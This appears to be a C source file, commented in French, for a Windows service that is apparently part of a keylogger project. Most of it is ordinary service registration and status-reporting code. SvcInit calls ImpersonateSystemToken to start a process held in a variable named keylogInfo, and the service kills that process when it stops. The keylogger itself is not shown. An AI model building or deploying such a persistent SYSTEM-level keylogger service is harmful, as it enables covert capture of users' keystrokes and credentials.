#include "svc.h"

extern HANDLE svcStopEvt;
extern SERVICE_STATUS_HANDLE svcStatusHandle;
extern SERVICE_STATUS svcStatus;

VOID WINAPI SvcMain(DWORD ac, LPTSTR *av)
{
    svcStatusHandle = RegisterServiceCtrlHandler(SVC_NAME, SvcCtrlHandler);
    if (!svcStatusHandle)
    {
        log("RegisterServiceCtrlHandler failed.\n");
        ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
        exit(1);
    }
    svcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    svcStatus.dwServiceSpecificExitCode = 0;
    ReportSvcStatus(SERVICE_START_PENDING, NO_ERROR, 3000);
    SvcInit(ac, av);
}

VOID SvcInit(DWORD ac, LPTSTR *av)
{
    (void)ac;
    (void)av;
    PROCESS_INFORMATION keylogInfo;
    // un event sera cree lorsque le sewrvice stoppera
    svcStopEvt = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (svcStopEvt == NULL)
    {
        ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
        exit(1);
    }
    //on previent le gestionnaire de service que le service a demarre
    ReportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0);
    ImpersonateSystemToken(&keylogInfo);
    while (1)
    {
        DWORD stopEvt = WaitForSingleObject(svcStopEvt, 1);
        if (stopEvt == WAIT_OBJECT_0)
        {
            TerminateProcess(keylogInfo.hProcess, 0);
            CloseHandle(keylogInfo.hProcess);
            CloseHandle(keylogInfo.hThread);
            ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
            exit(0);
        }
    }
        /*** FIN */
}

VOID WINAPI SvcCtrlHandler(DWORD ctrl)
{
    switch (ctrl)
    {
        case SERVICE_CONTROL_STOP:
            ReportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);
            SetEvent(svcStopEvt);
            ReportSvcStatus(svcStatus.dwCurrentState, NO_ERROR, 0);
            break;
        case SERVICE_CONTROL_INTERROGATE:
            ReportSvcStatus(svcStatus.dwCurrentState, NO_ERROR, 0);
            break;
        default:
            break;
    }
}

VOID ReportSvcStatus(DWORD currentState, DWORD win32ExitCode, DWORD waitHint)
{
    static DWORD savedCheckPoint = 1;

    svcStatus.dwCurrentState = currentState;
    svcStatus.dwWin32ExitCode = win32ExitCode;
    svcStatus.dwWaitHint = waitHint;
    //si le service doit demarrer, ne pas accepter de controle
    if (currentState == SERVICE_START_PENDING)
        svcStatus.dwControlsAccepted = 0;
    else
        svcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    // le checkpoint est utile lors des operations longues, et lorsque le service
    // doit faire plusieurs operation avant de demarrer
    if (currentState == SERVICE_RUNNING || currentState == SERVICE_STOPPED)
        svcStatus.dwCheckPoint = 0;
    else
        svcStatus.dwCheckPoint = savedCheckPoint++;
    //on set le statut du service pour le gestionnaire de service.
    SetServiceStatus(svcStatusHandle, &svcStatus);
}